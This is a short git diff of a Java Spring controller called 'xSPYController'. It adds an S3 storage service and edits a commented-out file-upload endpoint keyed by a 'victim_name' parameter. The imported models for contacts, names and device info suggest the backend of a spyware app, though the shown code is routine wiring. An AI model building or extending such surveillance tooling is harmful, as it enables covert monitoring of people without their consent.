@@ -6,10 +6,13 @@ import com.leadexperience.xspy.models.tables.ContactTable;
 import com.leadexperience.xspy.models.tables.DeviceInfo;
 import com.leadexperience.xspy.models.tables.NameTable;
 
+import com.leadexperience.xspy.s3.StorageService;
 import com.leadexperience.xspy.service.ApiService;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
+import org.springframework.web.multipart.MultipartFile;
 
 @RestController
 @RequestMapping("/xSPY")
@@ -18,6 +21,10 @@ public class xSPYController {
 
     @Autowired
     private ApiService apiService;
+
+    @Autowired
+    private StorageService storageService;
+
 
 
     @GetMapping("/hello")
@@ -44,7 +51,8 @@ public class xSPYController {
     // Aws Upload Images to S3 Bucket.
 
 //    @PostMapping("/upload")
-//    public ResponseEntity<String> uploadFile(@RequestParam(value = "file") MultipartFile file, @RequestParam(value = "victim_name" )String victimName) {
-//        return new ResponseEntity<>(service.uploadFile(file,victimName), HttpStatus.OK);
+//    public ResponseEntity<?> uploadFile(@RequestParam(value = "file") MultipartFile file, @RequestParam(value = "victim_name" )String victimName) {
+////        return new ResponseEntity<>(storageService.uploadFile(file,victimName), HttpStatus.OK);
+//        return storageService.uploadFile(file,victimName);
 //    }
 }
